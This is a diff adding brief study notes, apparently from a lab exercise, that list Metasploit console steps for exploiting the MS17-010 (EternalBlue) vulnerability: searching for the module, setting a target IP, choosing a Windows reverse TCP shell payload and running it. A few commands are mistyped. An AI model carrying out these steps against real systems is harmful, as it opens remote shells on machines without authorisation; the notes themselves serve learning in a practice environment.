@@ -1,0 +1,12 @@
+msfconsole          //run the framework
+
+search ms17-010        // search the vulnurabilities
+
+use0                    //exploit the vulnutrabilitie 0
+option                  //listing the configurable (RHOSTS ,RPORT.....)
+
+
+
+set RHOSTS 10.10.235.219                                  //setting the target
+set payload windows/x64/shell/reverse_tcp                //example for the payload that run on the target machine,       
+run                                                        //executing the exploit with the specified configuration
